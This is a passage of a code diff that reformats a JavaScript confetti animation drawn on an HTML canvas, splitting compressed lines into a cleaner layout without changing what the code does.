-            x: c.width / 2, y: c.height / 3, r: Math.random() * 4 + 2,
-            dx: (Math.random() - 0.5) * 10, dy: (Math.random() - 0.7) * 10,
-            color: ['#f59e0b', '#ef4444', '#10b981', '#3b82f6'][Math.floor(Math.random() * 4)]
-        }));
-        let f = 0;
-        (function draw() {
-            ctx.clearRect(0, 0, c.width, c.height);
-            p.forEach(i => {
-                i.x += i.dx; i.y += i.dy; i.dy += 0.2;
-                ctx.beginPath(); ctx.arc(i.x, i.y, i.r, 0, 7);
-                ctx.fillStyle = i.color; ctx.fill();
-            });
-            if (++f < 60) requestAnimationFrame(draw);
-            else { c.style.display = 'none'; ctx.clearRect(0, 0, c.width, c.height); }
-        })();
-    }
-</script>
+        function fireConfetti() {
+            const c = document.getElementById('confettiCanvas');
+            if (!c) return;
+            const ctx = c.getContext('2d');
+            c.width = window.innerWidth;
+            c.height = window.innerHeight;
+            c.style.display = 'block';
+
+            const p = Array.from({ length: 50 }, () => ({
+                x: c.width / 2, y: c.height / 3,
+                r: Math.random() * 4 + 2,
+                dx: (Math.random() - 0.5) * 10,
+                dy: (Math.random() - 0.7) * 10,
+                color: ['#f59e0b', '#ef4444', '#10b981', '#3b82f6'][Math.floor(Math.random() * 4)]
+            }));
+
+            let f = 0;
+            (function draw() {
+                ctx.clearRect(0, 0, c.width, c.height);
+                p.forEach(i => {
+                    i.x += i.dx; i.y += i.dy; i.dy += 0.2;
+                    ctx.beginPath();
+                    ctx.arc(i.x, i.y, i.r, 0, 7);
+                    ctx.fillStyle = i.color;
+                    ctx.fill();
+                });
+                if (++f < 60) requestAnimationFrame(draw);
+                else {
+                    c.style.display = 'none';
+                    ctx.clearRect(0, 0, c.width, c.height);
+                }
+            })();
+        }
+    </script>
 </body>
 </html>
